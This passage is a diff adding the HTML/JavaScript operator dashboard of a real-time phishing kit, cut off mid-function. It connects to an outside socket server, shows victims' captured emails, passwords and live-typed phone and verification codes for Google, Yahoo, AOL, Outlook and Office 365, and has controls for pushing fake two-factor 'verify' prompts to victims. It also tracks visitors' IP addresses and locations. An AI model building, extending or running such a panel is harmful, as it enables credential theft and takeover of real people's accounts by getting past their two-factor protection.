@@ -1,0 +1,1012 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Admin Dashboard</title>
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+    <style>
+      .mono {
+        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+      }
+      @keyframes pulse-dot {
+        0%,
+        100% {
+          opacity: 1;
+          transform: scale(1);
+        }
+        50% {
+          opacity: 0.4;
+          transform: scale(0.85);
+        }
+      }
+      .pulse-dot {
+        animation: pulse-dot 1.6s ease-in-out infinite;
+      }
+      @keyframes slide-in {
+        from {
+          opacity: 0;
+          transform: translateY(-6px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+      .slide-in {
+        animation: slide-in 0.35s ease-out;
+      }
+      @keyframes flash-row {
+        0% {
+          background-color: rgba(20, 184, 166, 0.35);
+        }
+        100% {
+          background-color: transparent;
+        }
+      }
+      .flash-row {
+        animation: flash-row 2.2s ease-out;
+      }
+    </style>
+  </head>
+
+  <body class="min-h-screen bg-slate-950 text-slate-100 font-sans p-6">
+    <div class="max-w-5xl mx-auto">
+      <header class="flex items-center justify-between mb-6">
+        <div class="flex items-center gap-3">
+          <h1 class="text-2xl font-semibold">Admin Dashboard</h1>
+          <span
+            id="live-indicator"
+            class="hidden items-center gap-1.5 text-[11px] text-teal-300 bg-teal-950 border border-teal-800 rounded-full px-2 py-0.5"
+          >
+            <span class="w-1.5 h-1.5 rounded-full bg-teal-400 pulse-dot"></span>
+            <span id="live-count">0</span> live
+          </span>
+        </div>
+        <div class="flex items-center gap-2">
+          <button
+            id="enable-alerts"
+            class="text-xs bg-teal-600 hover:bg-teal-500 text-white rounded px-3 py-1.5 font-medium"
+          >
+            🔔 Enable alerts
+          </button>
+          <button
+            id="alerts-enabled"
+            class="hidden items-center gap-2 text-xs bg-slate-800 hover:bg-slate-700 text-slate-200 rounded px-3 py-1.5 border border-slate-700"
+          >
+            <span>🔔 Alerts on</span>
+            <span class="text-slate-500">·</span>
+            <span id="sound-state" class="text-teal-300">sound ✓</span>
+            <span id="notif-state" class="text-teal-300">· notif ✓</span>
+          </button>
+          <span
+            id="conn-status"
+            class="text-xs px-2 py-1 rounded bg-slate-800 text-slate-400"
+            >connecting…</span
+          >
+        </div>
+      </header>
+
+      <!-- ===================== LIVE VISITORS ===================== -->
+      <section class="bg-slate-900 border border-slate-800 rounded-xl p-5 mb-6">
+        <div class="flex flex-wrap items-center justify-between gap-2 mb-3">
+          <div class="flex items-center gap-3">
+            <h2 class="text-sm font-medium text-slate-300">Live visitors</h2>
+            <span id="visitor-count" class="text-[11px] text-slate-500"
+              >0 on site</span
+            >
+          </div>
+          <div class="flex flex-wrap items-center gap-2 text-[11px]">
+            <button
+              id="test-sound"
+              class="text-[11px] bg-slate-800 hover:bg-slate-700 text-slate-200 rounded px-2.5 py-1 border border-slate-700"
+            >
+              🔊 Test sound
+            </button>
+            <button
+              id="clear-visits"
+              class="text-[11px] bg-slate-800 hover:bg-slate-700 text-slate-200 rounded px-2.5 py-1 border border-slate-700"
+            >
+              Clear feed
+            </button>
+          </div>
+        </div>
+        <div id="visitors" class="space-y-2">
+          <p class="text-sm text-slate-500">Waiting for visitors…</p>
+        </div>
+      </section>
+
+      <!-- ===================== VERIFICATION PAYLOAD ===================== -->
+      <section class="bg-slate-900 border border-slate-800 rounded-xl p-5 mb-6">
+        <div class="flex items-center justify-between mb-3">
+          <h2 class="text-sm font-medium text-slate-300">
+            Verification payload
+          </h2>
+          <label class="flex items-center gap-2 text-xs text-slate-400">
+            Target
+            <select
+              id="target"
+              class="bg-slate-950 border border-slate-700 rounded px-3 py-2 text-sm text-slate-100"
+            >
+              <option value="all">All providers</option>
+              <option value="google">Google only</option>
+              <option value="yahoo">Yahoo only</option>
+              <option value="aol">AOL only</option>
+              <option value="outlook">Outlook only</option>
+              <option value="office365">Office 365 only</option>
+              <option value="other">Other only</option>
+            </select>
+          </label>
+        </div>
+        <div
+          id="payload-fields"
+          class="grid grid-cols-1 sm:grid-cols-3 gap-3"
+        ></div>
+        <p
+          id="payload-hint"
+          class="text-[11px] text-slate-500 mt-3 leading-relaxed"
+        ></p>
+        <div class="mt-4 flex flex-wrap gap-2">
+          <button
+            id="send-all"
+            class="bg-[#0b57d0] hover:bg-[#0b57d0]/80 text-white rounded px-4 py-2 text-sm font-medium"
+          >
+            Send verify to target
+          </button>
+          <button
+            id="success-all"
+            class="bg-emerald-600 hover:bg-emerald-500 text-white rounded px-4 py-2 text-sm font-medium"
+          >
+            Mark target successful
+          </button>
+        </div>
+      </section>
+
+      <!-- ===================== CONNECTED SESSIONS ===================== -->
+      <section class="bg-slate-900 border border-slate-800 rounded-xl p-5 mb-6">
+        <div class="flex flex-wrap items-center justify-between gap-2 mb-3">
+          <div class="flex items-center gap-3">
+            <h2 class="text-sm font-medium text-slate-300">Sign-in sessions</h2>
+            <span class="text-[11px] text-slate-500 italic"
+              >persist until you delete them</span
+            >
+          </div>
+          <div class="flex flex-wrap items-center gap-2 text-[11px]">
+            <span id="provider-counts" class="text-slate-500"></span>
+            <span id="count" class="text-xs text-slate-500">0 users</span>
+            <button
+              id="clear-disconnected"
+              class="text-[11px] bg-slate-800 hover:bg-slate-700 text-slate-200 rounded px-2.5 py-1 border border-slate-700"
+            >
+              Clear disconnected
+            </button>
+          </div>
+        </div>
+        <div id="sessions" class="space-y-2">
+          <p class="text-sm text-slate-500">No users yet…</p>
+        </div>
+      </section>
+
+      <!-- ===================== LOG ===================== -->
+      <section class="bg-slate-900 border border-slate-800 rounded-xl p-5">
+        <h2 class="text-sm font-medium text-slate-300 mb-2">Log</h2>
+        <div
+          id="log"
+          class="h-40 overflow-y-auto text-xs mono text-slate-400 space-y-1"
+        ></div>
+      </section>
+    </div>
+
+    <script>
+      /* ============================================================
+       * CONSTANTS
+       * ============================================================ */
+      const PROVIDERS = [
+        'google',
+        'yahoo',
+        'aol',
+        'office365',
+        'outlook',
+        'other',
+      ]
+      const PROVIDER_LABEL = {
+        google: 'Google',
+        yahoo: 'Yahoo',
+        aol: 'AOL',
+        office365: 'Office 365',
+        outlook: 'Outlook',
+        other: 'Other',
+      }
+      const PROVIDER_BADGE = {
+        google: 'bg-red-900 text-red-200',
+        yahoo: 'bg-purple-900 text-purple-200',
+        aol: 'bg-sky-900 text-sky-200',
+        office365: 'bg-orange-900 text-orange-200',
+        outlook: 'bg-blue-900 text-blue-200',
+        other: 'bg-slate-800 text-slate-300',
+      }
+
+      /* ============================================================
+       * DOM REFERENCES
+       * ============================================================ */
+      const $ = (id) => document.getElementById(id)
+      const statusEl = $('conn-status')
+      const targetEl = $('target')
+      const fieldsEl = $('payload-fields')
+      const hintEl = $('payload-hint')
+      const sessionsEl = $('sessions')
+      const countEl = $('count')
+      const providerCountsEl = $('provider-counts')
+      const logEl = $('log')
+      const clearDisconnectedBtn = $('clear-disconnected')
+      const visitorsEl = $('visitors')
+      const visitorCountEl = $('visitor-count')
+      const liveIndicator = $('live-indicator')
+      const liveCountEl = $('live-count')
+      const enableAlertsBtn = $('enable-alerts')
+      const alertsEnabledBtn = $('alerts-enabled')
+      const soundStateEl = $('sound-state')
+      const notifStateEl = $('notif-state')
+      const testSoundBtn = $('test-sound')
+      const clearVisitsBtn = $('clear-visits')
+
+      /* ============================================================
+       * SOCKET
+       * ============================================================ */
+      const socket = io('https://realtime-signin.williamswizard1.deno.net', {
+        transports: ['websocket', 'polling'],
+      })
+
+      socket.on('connect', () => {
+        statusEl.textContent = 'connected'
+        statusEl.className =
+          'text-xs px-2 py-1 rounded bg-emerald-900 text-emerald-300'
+        log('connected as ' + socket.id)
+      })
+
+      socket.on('disconnect', () => {
+        statusEl.textContent = 'disconnected'
+        statusEl.className = 'text-xs px-2 py-1 rounded bg-red-900 text-red-300'
+        log('disconnected')
+      })
+
+      /* ============================================================
+       * ALERT SYSTEM (sound + browser notification)
+       * ============================================================ */
+      let audioCtx = null
+      let soundEnabled = false
+      let notifEnabled = false
+      let unreadVisits = 0
+      const baseTitle = 'Admin Dashboard'
+
+      /* Two-tone chime (Tawk.to style) via Web Audio API */
+      function playChime() {
+        if (!audioCtx || !soundEnabled) return
+        try {
+          if (audioCtx.state === 'suspended') audioCtx.resume()
+        } catch {}
+        const t = audioCtx.currentTime
+        ;[880, 1175].forEach((freq, i) => {
+          const osc = audioCtx.createOscillator()
+          const gain = audioCtx.createGain()
+          osc.type = 'sine'
+          osc.frequency.value = freq
+          osc.connect(gain)
+          gain.connect(audioCtx.destination)
+          const start = t + i * 0.13
+          gain.gain.setValueAtTime(0, start)
+          gain.gain.linearRampToValueAtTime(0.22, start + 0.01)
+          gain.gain.exponentialRampToValueAtTime(0.001, start + 0.42)
+          osc.start(start)
+          osc.stop(start + 0.5)
+        })
+      }
+
+      function showBrowserNotification(visit) {
+        if (!notifEnabled) return
+        if (
+          !('Notification' in window) ||
+          Notification.permission !== 'granted'
+        )
+          return
+        const city = visit.geo?.city || ''
+        const country = visit.geo?.country || ''
+        const loc =
+          [city, country].filter(Boolean).join(', ') || 'Unknown location'
+        const path =
+          visit.path.length > 40 ? visit.path.slice(0, 40) + '…' : visit.path
+        try {
+          const n = new Notification('👀 New visitor on your site', {
+            body: `${loc} · ${path}`,
+            tag: 'visit-' + visit.id,
+            icon: 'https://i.ibb.co/sd3k828K/greenvelope-logo-2x.webp',
+            silent: true,
+          })
+          n.onclick = () => {
+            window.focus()
+            n.close()
+          }
+        } catch {}
+      }
+
+      function updateTitle() {
+        document.title =
+          unreadVisits > 0 ? `(${unreadVisits}) ${baseTitle}` : baseTitle
+      }
+
+      async function requestAlerts() {
+        // 1) Create AudioContext on user gesture
+        try {
+          audioCtx = new (window.AudioContext || window.webkitAudioContext)()
+          if (audioCtx.state === 'suspended') await audioCtx.resume()
+          soundEnabled = true
+        } catch (e) {
+          log('audio init failed: ' + e.message)
+        }
+
+        // 2) Request browser notification permission
+        if ('Notification' in window && Notification.permission === 'default') {
+          try {
+            const p = await Notification.requestPermission()
+            notifEnabled = p === 'granted'
+          } catch {}
+        } else if (
+          'Notification' in window &&
+          Notification.permission === 'granted'
+        ) {
+          notifEnabled = true
+        }
+
+        enableAlertsBtn.classList.add('hidden')
+        alertsEnabledBtn.classList.remove('hidden')
+        alertsEnabledBtn.classList.add('flex')
+        soundStateEl.textContent = soundEnabled ? 'sound ✓' : 'sound ✗'
+        soundStateEl.className = soundEnabled
+          ? 'text-teal-300'
+          : 'text-slate-500'
+        notifStateEl.textContent = '· notif ' + (notifEnabled ? '✓' : '✗')
+        notifStateEl.className = notifEnabled
+          ? 'text-teal-300'
+          : 'text-slate-500'
+
+        playChime() // test beep so they know it works
+        log(
+          `alerts enabled · sound=${soundEnabled} · notifications=${notifEnabled}`,
+        )
+      }
+
+      enableAlertsBtn.addEventListener('click', requestAlerts)
+      alertsEnabledBtn.addEventListener('click', () => {
+        // toggle sound off/on
+        soundEnabled = !soundEnabled
+        soundStateEl.textContent = soundEnabled ? 'sound ✓' : 'sound ✗'
+        soundStateEl.className = soundEnabled
+          ? 'text-teal-300'
+          : 'text-slate-500'
+        if (soundEnabled) playChime()
+      })
+      testSoundBtn.addEventListener('click', () => {
+        if (!audioCtx) {
+          log('enable alerts first')
+          return
+        }
+        playChime()
+      })
+      clearVisitsBtn.addEventListener('click', () => {
+        socket.emit('admin_clear_visits')
+        log('cleared visitor feed')
+      })
+
+      // Reset unread badge when tab regains focus
+      window.addEventListener('focus', () => {
+        unreadVisits = 0
+        updateTitle()
+      })
+
+      /* ============================================================
+       * LIVE VISITORS
+       * ============================================================ */
+      let lastVisits = []
+      let seenVisitIds = new Set()
+
+      socket.on('new_visit', (visit) => {
+        if (seenVisitIds.has(visit.id)) return
+        seenVisitIds.add(visit.id)
+
+        playChime()
+        showBrowserNotification(visit)
+
+        unreadVisits++
+        updateTitle()
+      })
+
+      socket.on('visits_update', (visits) => {
+        lastVisits = visits
+        renderVisitors(visits)
+      })
+
+      function renderVisitors(visits) {
+        visitorCountEl.textContent = `${visits.length} on site`
+
+        if (visits.length > 0) {
+          liveIndicator.classList.remove('hidden')
+          liveIndicator.classList.add('inline-flex')
+          liveCountEl.textContent = visits.length
+        } else {
+          liveIndicator.classList.add('hidden')
+          liveIndicator.classList.remove('inline-flex')
+        }
+
+        if (visits.length === 0) {
+          visitorsEl.innerHTML =
+            '<p class="text-sm text-slate-500">Waiting for visitors…</p>'
+          return
+        }
+
+        const sorted = [...visits].sort((a, b) => b.visitedAt - a.visitedAt)
+        visitorsEl.innerHTML = ''
+        sorted
+          .slice(0, 20)
+          .forEach((v) => visitorsEl.appendChild(buildVisitorRow(v)))
+      }
+
+      function buildVisitorRow(v) {
+        const row = document.createElement('div')
+        row.className =
+          'bg-slate-950 border border-slate-800 rounded-lg p-3 flex flex-wrap items-center gap-3 slide-in'
+        row.dataset.visitId = v.id
+
+        const flag = v.geo?.flag || '🌐'
+        const city = v.geo?.city || ''
+        const region = v.geo?.region || ''
+        const country = v.geo?.country || ''
+        const loc =
+          [city, region, country].filter(Boolean).join(', ') ||
+          'Local / unknown'
+        const isp = v.geo?.isp || ''
+        const mapUrl =
+          v.geo?.latitude && v.geo?.longitude
+            ? `https://www.google.com/maps?q=${v.geo.latitude},${v.geo.longitude}`
+            : null
+
+        const browser = getBrowserName(v.ua)
+        const path = v.path || '/'
+        const ref = v.referrer ? shortHost(v.referrer) : 'direct'
+
+        row.innerHTML = `
+          <div class="flex items-center gap-3 flex-1 min-w-0">
+            <span class="text-2xl leading-none shrink-0">${flag}</span>
+            <div class="min-w-0">
+              <div class="text-sm font-medium truncate">
+                ${mapUrl ? `<a href="${mapUrl}" target="_blank" class="hover:text-teal-300 hover:underline">${escapeHtml(loc)}</a>` : escapeHtml(loc)}
+              </div>
+              <div class="text-[11px] text-slate-500 truncate">
+                <span class="mono">${escapeHtml(v.ip)}</span>
+                ${isp ? ' · ' + escapeHtml(isp) : ''}
+              </div>
+            </div>
+          </div>
+          <div class="text-[11px] text-slate-400 min-w-0">
+            <div><span class="text-slate-500">page:</span> <span class="mono">${escapeHtml(path)}</span></div>
+            <div><span class="text-slate-500">from:</span> ${escapeHtml(ref)} · ${escapeHtml(browser)}</div>
+          </div>
+          <div class="text-[11px] text-slate-500 shrink-0">${fmtAgo(v.visitedAt)}</div>
+        `
+
+        // Flash new arrivals (added in the last 3 seconds)
+        if (Date.now() - v.visitedAt < 3000) {
+          row.classList.add('flash-row')
+        }
+
+        return row
+      }
+
+      function getBrowserName(ua) {
+        if (!ua) return 'unknown'
+        if (/Edg\//.test(ua)) return 'Edge'
+        if (/OPR\//.test(ua)) return 'Opera'
+        if (/Firefox\//.test(ua)) return 'Firefox'
+        if (/Chrome\//.test(ua)) return 'Chrome'
+        if (/Safari\//.test(ua)) return 'Safari'
+        return 'browser'
+      }
+
+      function shortHost(url) {
+        try {
+          return new URL(url).hostname.replace(/^www\./, '')
+        } catch {
+          return url.slice(0, 30)
+        }
+      }
+
+      // Refresh "Xm ago" every 15s
+      setInterval(() => {
+        if (lastVisits.length) renderVisitors(lastVisits)
+      }, 15000)
+
+      /* ============================================================
+       * UTILITIES
+       * ============================================================ */
+      function log(msg) {
+        const t = new Date().toLocaleTimeString()
+        const line = document.createElement('div')
+        line.textContent = `[${t}] ${msg}`
+        logEl.prepend(line)
+        while (logEl.childNodes.length > 100) logEl.removeChild(logEl.lastChild)
+      }
+
+      function escapeHtml(s) {
+        return String(s).replace(
+          /[&<>"']/g,
+          (c) =>
+            ({
+              '&': '&amp;',
+              '<': '&lt;',
+              '>': '&gt;',
+              '"': '&quot;',
+              "'": '&#39;',
+            })[c],
+        )
+      }
+
+      function fmtTime(ts) {
+        return ts ? new Date(ts).toLocaleTimeString() : ''
+      }
+
+      function fmtAgo(ts) {
+        if (!ts) return ''
+        const sec = Math.floor((Date.now() - ts) / 1000)
+        if (sec < 5) return 'just now'
+        if (sec < 60) return `${sec}s ago`
+        const min = Math.floor(sec / 60)
+        if (min < 60) return `${min}m ago`
+        const hr = Math.floor(min / 60)
+        if (hr < 24) return `${hr}h ago`
+        return `${Math.floor(hr / 24)}d ago`
+      }
+
+      /* ============================================================
+       * PAYLOAD FORM (unchanged)
+       * ============================================================ */
+      function renderPayloadFields(provider) {
+        if (provider === 'aol') {
+          fieldsEl.innerHTML = `
+            <label class="block">
+              <span class="text-xs text-slate-400">Last 2 digits of phone</span>
+              <input id="aol-lastTwo" value="89" maxlength="2" inputmode="numeric"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-lg text-center tracking-widest" />
+            </label>
+            <div class="sm:col-span-2 flex items-end">
+              <div class="w-full text-[11px] text-slate-500 leading-relaxed">
+                User sees <span class="text-slate-300 mono">+1 ***-***-[__] 89</span>.
+                Then a 6-digit code step, then password.
+              </div>
+            </div>`
+          hintEl.textContent =
+            'AOL flow: email → password → 2-digit verify → 6-digit code.'
+        } else if (provider === 'yahoo') {
+          fieldsEl.innerHTML = `
+            <label class="block">
+              <span class="text-xs text-slate-400">Last 2 digits of phone</span>
+              <input id="yahoo-lastTwo" value="89" maxlength="2" inputmode="numeric"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-lg text-center tracking-widest" />
+            </label>
+            <label class="block">
+              <span class="text-xs text-slate-400">Correct 2 preceding (optional)</span>
+              <input id="yahoo-answer" value="" maxlength="2" inputmode="numeric" placeholder="e.g. 67"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-lg text-center tracking-widest" />
+            </label>
+            <div class="flex items-end">
+              <div class="w-full text-[11px] text-slate-500 leading-relaxed">
+                User sees <span class="text-slate-300 mono">+1 ***-***-[__] 89</span>.
+              </div>
+            </div>`
+          hintEl.textContent =
+            'Yahoo flow: admin supplies the last 2 digits and optionally the correct answer.'
+        } else if (provider === 'outlook') {
+          fieldsEl.innerHTML = `
+            <label class="block">
+              <span class="text-xs text-slate-400">Mask ending (header)</span>
+              <input id="outlook-phone" value="07" maxlength="2" inputmode="numeric"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-lg text-center tracking-widest" />
+            </label>
+            <label class="block">
+              <span class="text-xs text-slate-400">Last 2 digits (boxes 3 &amp; 4)</span>
+              <input id="outlook-lastTwo" value="73" maxlength="2" inputmode="numeric"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-lg text-center tracking-widest" />
+            </label>
+            <div class="flex items-end">
+              <div class="w-full text-[11px] text-slate-500 leading-relaxed">
+                User sees <span class="text-slate-300 mono">********07</span> in the header
+                and 4 boxes <span class="text-slate-300 mono">[__][__][7][3]</span>.
+              </div>
+            </div>`
+          hintEl.textContent =
+            'Outlook flow: email → verify (2-of-4 digits) → password.'
+        } else if (provider === 'other') {
+          fieldsEl.innerHTML = `
+            <div class="sm:col-span-3">
+              <div class="w-full text-[12px] text-slate-400 leading-relaxed bg-slate-950 border border-slate-800 rounded-md p-3">
+                <span class="text-slate-200 font-medium">Other flow:</span>
+                user enters <span class="text-slate-200">provider name</span>,
+                <span class="text-slate-200">email</span>, and
+                <span class="text-slate-200">password</span> directly.
+              </div>
+            </div>`
+          hintEl.textContent = 'Other flow: no admin payload required.'
+        } else {
+          const label = PROVIDER_LABEL[provider] || 'Google'
+          fieldsEl.innerHTML = `
+            <label class="block">
+              <span class="text-xs text-slate-400">Code</span>
+              <input id="code" value="30"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2 text-lg" />
+            </label>
+            <label class="block">
+              <span class="text-xs text-slate-400">Device</span>
+              <input id="device" value="iPhone Air"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2" />
+            </label>
+            <label class="block">
+              <span class="text-xs text-slate-400">Phone</span>
+              <input id="phone" value="iPhone Air"
+                class="mt-1 w-full bg-slate-950 border border-slate-700 rounded px-3 py-2" />
+            </label>`
+          hintEl.textContent = `${label} flow: admin supplies the numeric code to tap, plus the device and phone names.`
+        }
+      }
+
+      function readPayload() {
+        if (targetEl.value === 'aol')
+          return { lastTwo: ($('aol-lastTwo')?.value || '').trim() }
+        if (targetEl.value === 'yahoo')
+          return {
+            lastTwo: ($('yahoo-lastTwo')?.value || '').trim(),
+            answer: ($('yahoo-answer')?.value || '').trim(),
+          }
+        if (targetEl.value === 'outlook')
+          return {
+            phone: ($('outlook-phone')?.value || '').trim(),
+            lastTwo: ($('outlook-lastTwo')?.value || '').trim(),
+          }
+        if (targetEl.value === 'other') return {}
+        return {
+          code: $('code')?.value || '',
+          device: $('device')?.value || '',
+          phone: $('phone')?.value || '',
+        }
+      }
+
+      function pickProvider(v) {
+        if (v === 'aol') return 'aol'
+        if (v === 'yahoo') return 'yahoo'
+        if (v === 'outlook') return 'outlook'
+        if (v === 'other') return 'other'
+        return 'google'
+      }
+
+      renderPayloadFields(pickProvider(targetEl.value))
+      targetEl.addEventListener('change', (e) =>
+        renderPayloadFields(pickProvider(e.target.value)),
+      )
+
+      /* ============================================================
+       * BULK ACTIONS
+       * ============================================================ */
+      $('send-all').addEventListener('click', () => {
+        socket.emit('admin_send_verify', {
+          targetSocketId: targetEl.value,
+          ...readPayload(),
+        })
+        log(`sent verify → ${targetEl.value}`)
+      })
+      $('success-all').addEventListener('click', () => {
+        socket.emit('admin_send_success', { targetSocketId: targetEl.value })
+        log(`success → ${targetEl.value}`)
+      })
+      clearDisconnectedBtn.addEventListener('click', () => {
+        socket.emit('admin_delete_session', { targetSocketId: 'disconnected' })
+        log('deleted all disconnected sessions')
+      })
+
+      /* ============================================================
+       * SESSIONS (unchanged)
+       * ============================================================ */
+      let lastSessions = []
+      socket.on('admin_session_update', (sessions) => {
+        lastSessions = sessions
+        renderCounts(sessions)
+        renderSessions(sessions)
+      })
+      setInterval(() => {
+        if (lastSessions.length) renderSessions(lastSessions)
+      }, 30000)
+
+      function renderCounts(sessions) {
+        const active = sessions.filter((s) => s.connected !== false).length
+        const inactive = sessions.length - active
+        let countText = `${sessions.length} user${sessions.length === 1 ? '' : 's'}`
+        if (inactive > 0)
+          countText += ` · ${active} active · ${inactive} disconnected`
+        countEl.textContent = countText
+        const counts = {}
+        for (const p of PROVIDERS) counts[p] = 0
+        for (const s of sessions) {
+          const key = (s.provider || 'google').toLowerCase()
+          counts[key] = (counts[key] || 0) + 1
+        }
+        const parts = PROVIDERS.filter((p) => counts[p] > 0).map(
+          (p) => `${PROVIDER_LABEL[p] || p}: ${counts[p]}`,
+        )
+        providerCountsEl.textContent = parts.length ? parts.join(' · ') : ''
+      }
+
+      function renderSessions(sessions) {
+        if (sessions.length === 0) {
+          sessionsEl.innerHTML =
+            '<p class="text-sm text-slate-500">No users yet…</p>'
+          return
+        }
+        const sorted = [...sessions].sort((a, b) => {
+          const aConn = a.connected !== false
+          const bConn = b.connected !== false
+          if (aConn !== bConn) return aConn ? -1 : 1
+          const aTime = aConn
+            ? a.connectedAt
+            : a.disconnectedAt || a.connectedAt
+          const bTime = bConn
+            ? b.connectedAt
+            : b.disconnectedAt || b.connectedAt
+          return bTime - aTime
+        })
+        sessionsEl.innerHTML = ''
+        for (const s of sorted) sessionsEl.appendChild(buildSessionRow(s))
+      }
+
+      function buildSessionRow(s) {
+        const provider = (s.provider || 'google').toLowerCase()
+        const isConnected = s.connected !== false
+        const hasCreds = !!s.credentials
+        const hasAnswer = !!(s.userAnswer && s.userAnswer.digits)
+        const hasCode = !!(s.verificationCode && s.verificationCode.digits)
+        const anyData = hasCreds || hasAnswer || hasCode
+        const row = document.createElement('div')
+        const base =
+          'bg-slate-950 rounded-lg p-3 flex flex-col gap-3 transition-opacity'
+        if (!isConnected)
+          row.className = `${base} border border-slate-800 opacity-75`
+        else if (anyData) row.className = `${base} border-2 border-emerald-700`
+        else row.className = `${base} border border-slate-800`
+        row.appendChild(buildSessionTopRow(s, provider))
+        row.appendChild(buildCredentialsBlock(s, provider))
+        return row
+      }
+
+      function buildSessionTopRow(s, provider) {
+        const isConnected = s.connected !== false
+        const providerLabel =
+          provider === 'other' && s.providerName
+            ? s.providerName
+            : PROVIDER_LABEL[provider] || provider
+        const providerClass =
+          PROVIDER_BADGE[provider] || 'bg-slate-800 text-slate-300'
+        const connBadge = isConnected
+          ? '<span class="text-xs px-2 py-0.5 rounded bg-teal-900 text-teal-200 border border-teal-800">● live</span>'
+          : '<span class="text-xs px-2 py-0.5 rounded bg-slate-800 text-slate-400 border border-slate-700">○ disconnected</span>'
+        const statusBadge = s.success
+          ? '<span class="text-xs px-2 py-0.5 rounded bg-emerald-900 text-emerald-300">success</span>'
+          : s.pendingData
+            ? '<span class="text-xs px-2 py-0.5 rounded bg-blue-900 text-blue-300">data sent</span>'
+            : '<span class="text-xs px-2 py-0.5 rounded bg-amber-900 text-amber-300">waiting</span>'
+        const timeLabel = isConnected
+          ? `connected ${fmtAgo(s.connectedAt)}`
+          : `disconnected ${fmtAgo(s.disconnectedAt || s.connectedAt)}`
+        const infoParts = []
+        const isOutlook = provider === 'outlook'
+        if (s.pendingData) {
+          if (isOutlook) {
+            if (s.pendingData.phone !== undefined)
+              infoParts.push(
+                `<span class="text-xs text-slate-400">mask: <span class="mono text-slate-200">********${escapeHtml(s.pendingData.phone)}</span></span>`,
+              )
+            if (s.pendingData.lastTwo !== undefined)
+              infoParts.push(
+                `<span class="text-xs text-slate-400">last: <span class="mono text-slate-200">${escapeHtml(s.pendingData.lastTwo)}</span></span>`,
+              )
+          } else if (s.pendingData.lastTwo !== undefined) {
+            infoParts.push(
+              `<span class="text-xs text-slate-400">last: <span class="mono text-slate-200">${escapeHtml(s.pendingData.lastTwo)}</span></span>`,
+            )
+            if (s.pendingData.answer)
+              infoParts.push(
+                `<span class="text-xs text-slate-400">expected: <span class="mono text-slate-200">${escapeHtml(s.pendingData.answer)}</span></span>`,
+              )
+          } else if (s.pendingData.code !== undefined) {
+            infoParts.push(
+              `<span class="text-xs text-slate-400">→ ${escapeHtml(s.pendingData.code)} / ${escapeHtml(s.pendingData.device || '—')} / ${escapeHtml(s.pendingData.phone || '—')}</span>`,
+            )
+          }
+        }
+        if (s.userAnswer && s.userAnswer.digits) {
+          const cls = s.userAnswer.submitted
+            ? 'bg-emerald-900 text-emerald-200 border border-emerald-700'
+            : 'bg-amber-900 text-amber-200 border border-amber-700'
+          const label = isOutlook
+            ? s.userAnswer.submitted
+              ? 'verify submitted'
+              : 'verify typing'
+            : s.userAnswer.submitted
+              ? 'phone submitted'
+              : 'phone typing'
+          infoParts.push(
+            `<span class="text-xs px-2 py-0.5 rounded ${cls}">${label}: <span class="mono">${escapeHtml(s.userAnswer.digits)}</span></span>`,
+          )
+        }
+        if (s.verificationCode && s.verificationCode.digits) {
+          const cls = s.verificationCode.submitted
+            ? 'bg-emerald-900 text-emerald-200 border border-emerald-700'
+            : 'bg-amber-900 text-amber-200 border border-amber-700'
+          infoParts.push(
+            `<span class="text-xs px-2 py-0.5 rounded ${cls}">${s.verificationCode.submitted ? 'code submitted' : 'code typing'}: <span class="mono">${escapeHtml(s.verificationCode.digits)}</span></span>`,
+          )
+        }
+        const top = document.createElement('div')
+        top.className = 'flex flex-wrap items-center gap-3'
+        top.innerHTML = `
+          <div class="flex-1 min-w-0">
+            <div class="text-sm font-medium truncate">${escapeHtml(s.email || 'unknown')}</div>
+            <div class="text-[11px] text-slate-500 mono truncate">${escapeHtml(s.id)} · step: ${escapeHtml(s.step || '—')} · ${escapeHtml(timeLabel)}</div>
+          </div>
+          <span class="text-xs px-2 py-0.5 rounded ${providerClass}">${escapeHtml(providerLabel)}</span>
+          ${connBadge}${statusBadge}${infoParts.join(' ')}
+          <button data-act="send" data-id="${s.id}" ${isConnected ? '' : 'disabled'}
+            class="text-xs bg-[#0b57d0] hover:bg-[#0b57d0]/80 text-white rounded px-3 py-1.5 ${isConnected ? '' : 'opacity-40 cursor-not-allowed'}">Send verify</button>
+          <button data-act="success" data-id="${s.id}" ${isConnected ? '' : 'disabled'}
+            class="text-xs bg-emerald-600 hover:bg-emerald-500 text-white rounded px-3 py-1.5 ${isConnected ? '' : 'opacity-40 cursor-not-allowed'}">Success</button>
+          <button data-act="delete" data-id="${s.id}"
+            class="text-xs bg-red-900 hover:bg-red-800 text-red-100 rounded px-3 py-1.5 border border-red-800">Delete</button>`
+        return top
+      }
+
+      function buildCredentialsBlock(s, provider) {
+        const wrap = document.createElement('div')
+        const isYahoo = provider === 'yahoo',
+          isAol = provider === 'aol',
+          isOutlook = provider === 'outlook',
+          isOther = provider === 'other'
+        const usesVerify = isYahoo || isAol || isOutlook
+        const usesCode = isAol
+        const hasCreds = !!s.credentials
+        const hasAnswer = !!(s.userAnswer && s.userAnswer.digits)
+        const hasCode = !!(s.verificationCode && s.verificationCode.digits)
+        if (!hasCreds && !hasAnswer && !hasCode) {
+          wrap.className =
+            'bg-slate-900 border border-dashed border-slate-700 rounded-md px-3 py-2 text-xs text-amber-400 flex items-center gap-2'
+          wrap.innerHTML =
+            '<span class="inline-block w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>Waiting for user input…'
+          return wrap
+        }
+        const rows = []
+        const dash = '<span class="text-slate-500 italic">—</span>'
+        if (isOther) {
+          const pn =
+            (s.credentials && s.credentials.providerName) ||
+            s.providerName ||
+            ''
+          if (pn)
+            rows.push(
+              `<div class="flex items-center gap-2"><span class="text-slate-500 w-20 shrink-0">Provider</span><span class="text-slate-100 truncate">${escapeHtml(pn)}</span></div>`,
+            )
+        }
+        const emailVal =
